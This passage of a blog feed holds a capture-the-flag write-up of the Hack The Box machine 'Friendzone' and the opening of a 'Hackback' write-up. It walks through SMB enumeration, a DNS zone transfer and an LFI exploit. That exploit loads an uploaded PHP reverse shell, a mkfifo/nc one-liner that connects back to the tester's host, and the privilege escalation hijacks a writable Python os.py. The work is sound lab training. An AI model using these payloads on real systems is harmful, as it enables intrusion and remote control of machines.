&lt;h4 id=&quot;we-got-ftp-on-port-21-ssh-on-port-22-dns-on-port-53-http-on-port-80-https-on-port-443-and-smb-unfortunately-anonymous-login-wasnt-allowed-on-ftp-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;. Unfortunately anonymous login wasn’t allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
Connected to friendzone.htb.
220 (vsFTPd 3.0.3)
Name (friendzone.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-check-smb&quot;&gt;Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
&lt;h4 id=&quot;i-used-smbclient-to-list-the-shares-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient --list friendzone.htb -U &quot;&quot;
Enter WORKGROUP\'s password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-also-used-smbmap-to-know-what-permissions-do-i-have--smbmap--h-friendzonehtb--i-found-that-i-had-read-access-to-general-and-readwrite-access-to-development-i-also-noticed-that-the-comment-of-the-share-files-discloses-the-path-of-that-share--etcfiles-so-we-can-assume-that-all-shares-are-in-etc&quot;&gt;I also used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap&lt;/code&gt; to know what permissions do I have : &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H friendzone.htb&lt;/code&gt;.  I found that I had read access to &lt;code class=&quot;highlighter-rouge&quot;&gt;general&lt;/code&gt; and read/write access to &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt;. I also noticed that the comment of the share &lt;code class=&quot;highlighter-rouge&quot;&gt;Files&lt;/code&gt; discloses the path of that share : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Files&lt;/code&gt;, so we can assume that all shares are in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;in-general-i-found-a-file-called-credstxt-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;general&lt;/code&gt; I found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;creds.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/general -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Wed Jan 16 22:10:51 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6434016 blocks available
smb: \&amp;gt; get creds.txt 
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-we-have-credentials-but-we-dont-know-where-to-use-them-it-says-creds-for-the-admin-thing-so-lets-keep-enumerating-until-we-find-that-admin-thing&quot;&gt;So we have credentials but we don’t know where to use them, it says &lt;code class=&quot;highlighter-rouge&quot;&gt;creds for the admin THING&lt;/code&gt;, so let’s keep enumerating until we find that admin thing.&lt;/h4&gt;
&lt;h4 id=&quot;development-was-just-empty-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; was just empty :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Fri Jul 12 13:17:50 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-since-we-have-write-access-to-that-share-and-we-know-its-path--etcdevelopment-then-that-share-can-help-us-later-if-we-have-a-an-lfi-or-a-similar-vulnerability&quot;&gt;But since we have write access to that share and we know its path : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt; then that share can help us later if we have a an &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt; or a similar vulnerability.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-and-dns&quot;&gt;HTTP and DNS&lt;/h3&gt;
&lt;h4 id=&quot;httpfriendzonehtb-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://friendzone.htb&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;a-static-page-not-really-interesting-i-noticed-that-email-at-the-bottom--infofriendzoneportalred-so-i-added-friendzoneportalred-to-etchosts-&quot;&gt;A static page, not really interesting, I noticed that email at the bottom : &lt;code class=&quot;highlighter-rouge&quot;&gt;info@friendzoneportal.red&lt;/code&gt; so I added &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzoneportal.red&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-httpfriendzoneportalred-was-just-the-same-thing-&quot;&gt;But &lt;code class=&quot;highlighter-rouge&quot;&gt;http://friendzoneportal.red&lt;/code&gt; was just the same thing :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-went-back-and-added-friendzonered-to-the-hosts-file-&quot;&gt;I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzone.red&lt;/code&gt; to the hosts file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-was-also-the-same-thing-then-i-remembered-that-theres-a-dns-server-so-i-used-dig-&quot;&gt;But it was also the same thing. Then I remembered that there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; server so I used dig :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.5-P4-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 402 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Fri Jul 12 13:22:51 EET 2019
;; XFR size: 8 records (messages 1, bytes 289)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-have--administrator1friendzonered-hrfriendzonered-and-uploadsfriendzonered-i-edited-the-hosts-file-again-&quot;&gt;now we have : &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator1.friendzone.red&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;hr.friendzone.red&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;uploads.friendzone.red&lt;/code&gt;. I edited the hosts file again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-still-got-the-same-thing-i-ran-gobuster-and-got-wordpress-which-was-empty-&quot;&gt;But I still got the same thing, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got &lt;code class=&quot;highlighter-rouge&quot;&gt;/wordpress&lt;/code&gt; which was empty :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-robotstxt-which-wasnt-a-real-robotstxt-file-d&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; which wasn’t a real &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file :D&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-was-another-https-port-so-i-tried-that&quot;&gt;There was another &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; port so I tried that.&lt;/h4&gt;
&lt;h4 id=&quot;httpsfriendzonered-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://friendzone.red&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;httpsadministrator1friendzonered-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://administrator1.friendzone.red&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-this-is-the-administrator-thing-lets-try-the-credentials-we-have-&quot;&gt;So this is the “administrator thing” let’s try the credentials we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/friendzone/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-dashboardphp-&quot;&gt;Great. &lt;code class=&quot;highlighter-rouge&quot;&gt;/dashboard.php&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;lfi-in-dashboardphp-user-flag&quot;&gt;LFI in dashboard.php, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;as-you-can-see-its-complaining-about-missing-parameters-by-looking-at-the-example--image_idajpgpagenametimestamp-my-first-guess-was-that-dashboardphp-includes-the-php-file-provided-in-the-pagename-parameter-so-if-we-give-it-test-it-will-append-php-to-test-then-include-that-file-we-can-upload-files-to-the-smb-share-development-and-we-also-know-the-full-path--etcdevelopment-so-if-its-really-vulnerable-to-lfi-we-can-get-a-reverse-shell-easily-i-wrote-a-small-php-script-to-get-a-reverse-shell-&quot;&gt;As you can see it’s complaining about missing parameters, by looking at the example : &lt;code class=&quot;highlighter-rouge&quot;&gt;image_id=a.jpg&amp;amp;pagename=timestamp&lt;/code&gt; my first guess was that &lt;code class=&quot;highlighter-rouge&quot;&gt;dashboard.php&lt;/code&gt; includes the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file provided in the &lt;code class=&quot;highlighter-rouge&quot;&gt;pagename&lt;/code&gt; parameter. So if we give it &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; it will append &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; then include that file. We can upload files to the &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; and we also know the full path : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt;, so if it’s really vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt; we can get a reverse shell easily. I wrote a small &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to get a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-uploaded-it-to-development-&quot;&gt;Then I uploaded it to &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; put rev.php 
putting file rev.php as \rev.php (0.3 kb/s) (average 0.3 kb/s)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-finally-i-tested-my-idea-&quot;&gt;And finally I tested my idea :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&amp;amp;pagename=/etc/Development/rev&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/friendzone/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-now-we-have-a-reverse-shell-as-www-data-&quot;&gt;It worked and now we have a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-as-friend-privilege-escalation&quot;&gt;SSH as friend, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;i-looked-into-varwww-and-found-a-file-called-mysql_dataconf-which-had-some-credentials-&quot;&gt;I looked into &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; and found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_data.conf&lt;/code&gt; which had some credentials :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls -la
total 36
drwxr-xr-x  8 root root 4096 Oct  6  2018 .
drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Oct  6  2018 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
$ cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-could-get-ssh-access-as-friend-with-them-&quot;&gt;I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; access as friend with them :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# ssh friend@friendzone.htb
The authenticity of host 'friendzone.htb (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'friendzone.htb,10.10.10.123' (ECDSA) to the list of known hosts.
friend@friendzone.htb's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                             

You have mail.
Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
friend@FriendZone:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-did-the-regular-enumeration-and-i-ran-pspy-to-monitor-the-processes-to-see-if-theres-something-that-can-be-exploited-&quot;&gt;I did the regular enumeration and I ran &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;&lt;/a&gt; to monitor the processes to see if there’s something that can be exploited :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-some-time-i-saw-this-&quot;&gt;After some time I saw this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;root-runs-optserver_adminreporterpy--from-time-to-time&quot;&gt;Root runs &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/server_admin/reporter.py&lt;/code&gt;  from time to time.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = &quot;admin1@friendzone.com&quot;
from_address = &quot;admin2@friendzone.com&quot;

print &quot;[+] Trying to send email to %s&quot;%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-if-we-can-write-to-that-script-then-we-can-get-a-shell-as-root-unfortunately-we-cant-&quot;&gt;So if we can write to that script then we can get a shell as root. Unfortunately we can’t :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-noticed-that-its-importing-the-os-library-usually-python-libraries-are-only-writable-by-root-but-i-checked-ospy-and-friend-had-permissions-to-write-to-it-&quot;&gt;But I noticed that it’s importing the &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; library. Usually python libraries are only writable by root, but I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;os.py&lt;/code&gt; and friend had permissions to write to it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
-rw-rw-r--  1 friend friend    476 Jul 12 14:39 os.py
-rw-r--r--  1 root   root     1187 Jul 12 14:40 os.pyc
-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-just-put-those-two-lines-at-the-bottom-of-ospy-&quot;&gt;So I just put those two lines at the bottom of &lt;code class=&quot;highlighter-rouge&quot;&gt;os.py&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-after-a-minute-i-got-a-shell-&quot;&gt;And after a minute I got a shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---ctf&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ctf/&quot;&gt;Hack The Box - CTF&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="smb" /><category term="Web" /><category term="LFI" /><category term="php" /><category term="ssh" /><category term="Python" /><summary type="html">Quick Summary Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is 10.10.10.123, I added it to /etc/hosts as friendzone.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT friendzone.htb Note : I didn’t do a script scan (-sC) because for some reason it took a lot of time and didn’t finish. We got ftp on port 21, ssh on port 22, dns on port 53, http on port 80, https on port 443 and smb. Unfortunately anonymous login wasn’t allowed on ftp : root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb Connected to friendzone.htb. 220 (vsFTPd 3.0.3) Name (friendzone.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; Let’s check smb. SMB I used smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/friendzone# smbclient –list friendzone.htb -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/friendzone/0.png" /></entry><entry><title type="html">Hack The Box - Hackback</title><link href="http://localhost:4000/hack-the-box/hackback/" rel="alternate" type="text/html" title="Hack The Box - Hackback" /><published>2019-07-06T00:00:00+02:00</published><updated>2019-07-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hackback</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hackback/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-hackback-retired-and-heres-my-write-up-about-it-hackback-was-a-very-hard-machine-full-of-different-steps-and-rabbit-holes-its-a-windows-machine-and-its-ip-is-101010128-i-added-it-to-etchosts-as-hackbackhtb-lets-jump-right-in-&quot;&gt;Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.128&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;hackback.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC hackback.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-two-http-ports-80-and-6666-i-also-ran-a-full-scan-but-well-get-to-that-later&quot;&gt;We got two &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports, 80 and 6666, I also ran a full scan but we’ll get to that later.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-both-ports-on-80-there-was-this-donkey-image-&quot;&gt;I checked both ports, on 80 there was this donkey image :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-and-it-got-nothing&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and it got nothing.&lt;/h4&gt;
